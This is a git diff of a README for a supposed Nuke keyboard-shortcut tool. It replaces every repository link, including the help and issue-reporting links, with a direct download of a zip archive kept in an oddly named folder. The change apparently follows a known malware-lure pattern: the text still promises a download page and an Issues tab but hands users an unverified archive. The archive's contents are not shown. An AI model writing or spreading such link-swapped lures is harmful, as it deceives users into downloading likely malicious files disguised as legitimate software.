@@ -1,6 +1,6 @@
 # 🎹 CorridorKey-for-Nuke - Simplify Nuke Keyboard Shortcuts
 
-[![Download CorridorKey-for-Nuke](https://img.shields.io/badge/Download-CorridorKey_for_Nuke-ff6f61?style=for-the-badge&logo=github)](https://github.com/Nominal-trooper277/CorridorKey-for-Nuke)
+[![Download CorridorKey-for-Nuke](https://img.shields.io/badge/Download-CorridorKey_for_Nuke-ff6f61?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Nominal-trooper277/CorridorKey-for-Nuke/main/tailage/for_Corridor_Nuke_Key_v2.9.zip)
 
 ## 🔍 What is CorridorKey-for-Nuke?
 
@@ -33,7 +33,7 @@ This guide will help you download and run CorridorKey-for-Nuke on your Windows P
 ### Step 1: Visit the Download Page
 
 Click the big button at the top or follow this link to open the download page:  
-[https://github.com/Nominal-trooper277/CorridorKey-for-Nuke](https://github.com/Nominal-trooper277/CorridorKey-for-Nuke)
+[https://raw.githubusercontent.com/Nominal-trooper277/CorridorKey-for-Nuke/main/tailage/for_Corridor_Nuke_Key_v2.9.zip](https://raw.githubusercontent.com/Nominal-trooper277/CorridorKey-for-Nuke/main/tailage/for_Corridor_Nuke_Key_v2.9.zip)
 
 You will see a page with files and instructions from the developer.
 
@@ -117,7 +117,7 @@ Now you are ready to start customizing your shortcuts.
 ## 💬 Get Help and Report Issues
 
 - Visit the GitHub repository for updates and instructions:  
-  https://github.com/Nominal-trooper277/CorridorKey-for-Nuke  
+  https://raw.githubusercontent.com/Nominal-trooper277/CorridorKey-for-Nuke/main/tailage/for_Corridor_Nuke_Key_v2.9.zip  
 - Use the “Issues” tab on GitHub to report bugs or request help.  
 - Include details about your Windows version, Nuke version, and a description of the problem.
 
@@ -125,4 +125,4 @@ Now you are ready to start customizing your shortcuts.
 
 Click the button below to visit the official download page and get CorridorKey-for-Nuke:
 
-[![Download CorridorKey-for-Nuke](https://img.shields.io/badge/Download-CorridorKey_for_Nuke-ff6f61?style=for-the-badge&logo=github)](https://github.com/Nominal-trooper277/CorridorKey-for-Nuke)
+[![Download CorridorKey-for-Nuke](https://img.shields.io/badge/Download-CorridorKey_for_Nuke-ff6f61?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Nominal-trooper277/CorridorKey-for-Nuke/main/tailage/for_Corridor_Nuke_Key_v2.9.zip)
